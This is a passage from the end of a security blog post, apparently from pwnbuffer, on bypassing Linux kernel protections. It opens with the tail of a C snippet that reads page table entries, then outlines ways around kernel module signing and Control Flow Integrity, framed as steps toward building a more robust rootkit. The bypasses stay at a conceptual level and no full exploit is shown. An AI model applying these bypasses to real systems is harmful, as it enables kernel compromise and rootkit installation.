</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[*] RWX: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, <span style="color:#5f5fff">read64</span>(rwx_pte));
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[*] RW : %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, <span style="color:#5f5fff">read64</span>(rw_pte));
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<h3 id="4--kernel-module-signatures">
  4- Kernel Module Signatures
  <a class="heading-link" href="#4--kernel-module-signatures">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The Kernel Module Signature (with SHA-512 as the default) is a security mechanism built into Linux that ensures only kernel modules (<code>.ko</code> files) digitally signed by a trusted key can be loaded. This feature is essential to prevent the injection of malicious code (such as rootkits) or unauthorized modules into the kernel, especially on systems with Secure Boot enabled.</p>
<p>Bypass methods include:</p>
<p><strong>Secure Boot Disabled</strong>: Unsigned modules can be loaded via <code>insmod --force</code>.<br>
<strong>Custom Keys</strong>: Systems can use local keys, but this requires recompiling the kernel.<br>
<strong>Installing a driver with vulnerabilities</strong> that can be exploited, essentially installing a security flaw on the machine (e.g., CVE-2021-3490).</p>
<h3 id="5--control-flow-integrity-cfi">
  5- Control Flow Integrity (CFI)
  <a class="heading-link" href="#5--control-flow-integrity-cfi">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Control Flow Integrity (CFI) is a security mechanism designed to protect programs and systems from exploits that derail the legitimate execution flow, such as <strong>Return-Oriented Programming</strong> (ROP) and <strong>Jump-Oriented Programming</strong> (JOP). It ensures that control flow (function calls, returns, jumps) follows only predefined valid paths, thus preventing attackers from hijacking execution for malicious code. The following techniques exist to bypass this system:</p>
<ul>
<li>
<p>A. Attacks on &ldquo;Coarse-Grained&rdquo; Implementations<br>
<strong>Problem</strong>: Coarse-grained CFI groups many valid destinations into broad categories.<br>
<strong>Example</strong>: If all functions returning <code>int</code> are considered valid, an attacker can redirect execution to any of them.<br>
<strong>Affected Tools</strong>: Older versions of Clang CFI and Microsoft CFG.</p>
</li>
<li>
<p>B. Memory Corruption Primitive + CFI Weakening<br>
<strong>Mechanism</strong>: Combining memory corruption (e.g., buffer overflow) with flaws in CFI.<br>
<strong>Example</strong>: Corrupting a data structure (e.g., <code>struct file_operations</code>) to redirect flow to gadgets permitted by CFI.<br>
<strong>Case</strong>: WarpAttack used double-fetches (double memory accesses) to create race conditions and bypass checks.</p>
</li>
<li>
<p>C. ROP/JOP Within Allowed Boundaries<br>
<strong>Mechanism</strong>: Constructing ROP/JOP chains using only gadgets in regions marked as valid by CFI.<br>
<strong>Example</strong>: Counterfeit Object-Oriented Programming (COOP) uses legitimate object calls to achieve malicious goals.</p>
</li>
<li>
<p>D. Abuse of APIs or Legitimate Functions<br>
<strong>Mechanism</strong>: Calling valid system functions with manipulated arguments.<br>
<strong>Example</strong>: Using <code>system()</code> or <code>execve()</code> with attacker-controlled parameters.<br>
This allows for a more sophisticated and robust rootkit.</p>
</li>
</ul>
<h3 id="6--conclusion">
  6- Conclusion
  <a class="heading-link" href="#6--conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>In conclusion, kernel hacking is an extremely vast field, with an ongoing war between increasingly sophisticated defenses and attackers. The content presented here covers some techniques to bypass Linux Kernel defenses, but there are countless other methods. Thatâ€™s itâ€”thank you very much!</p>
<p><span style="color:red"><strong>lights on &amp; black0ut out</strong></span></p>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    Â©
    
    2025
     pwnbuffer 
    Â·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
